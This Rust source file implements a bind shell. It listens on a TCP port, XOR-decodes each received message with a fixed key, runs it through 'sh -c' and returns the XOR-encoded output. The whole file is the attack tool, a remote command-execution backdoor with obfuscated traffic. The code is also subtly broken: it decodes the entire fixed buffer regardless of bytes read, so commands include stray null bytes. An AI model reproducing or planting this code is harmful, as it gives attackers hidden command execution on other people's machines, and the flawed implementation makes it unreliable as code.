use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};

fn main() {
    let listener = TcpListener::bind("127.0.0.1:8081").expect("Failed to bind to address");

    for stream in listener.incoming() {
        match stream {
            Ok(mut stream) => {
                std::thread::spawn(move || {
                    handle_client(&mut stream);
                });
            }
            Err(e) => eprintln!("Error accepting connection: {}", e),
        }
    }
}

fn handle_client(stream: &mut TcpStream) {
    let mut buffer = [0; 1024];

    loop {
        stream.read(&mut buffer).expect("Failed to read from stream");

        // XOR encryption and decryption
        let key: u8 = 42;
        for byte in buffer.iter_mut() {
            *byte ^= key;
        }

        // Exit if the client sends "exit" command
        let command = String::from_utf8_lossy(&buffer);
        if command.trim().to_lowercase() == "exit" {
            println!("Client requested exit. Closing connection.");
            break;
        }

        // Execute the command using std::process::Command
        let output = execute_command(&command);

        // Encrypt the output before sending it back
        let mut encrypted_output = output.into_bytes();
        for byte in encrypted_output.iter_mut() {
            *byte ^= key;
        }

        stream.write_all(&encrypted_output).expect("Failed to write to stream");
    }
}

fn execute_command(command: &str) -> String {
    // Execute the command using std::process::Command
    use std::process::Command;
    let output = Command::new("sh")
        .arg("-c")
        .arg(command)
        .output();

    match output {
        Ok(output) => String::from_utf8_lossy(&output.stdout).to_string(),
        Err(e) => {
            eprintln!("Failed to execute command: {}", e);
            String::new()
        }
    }
}
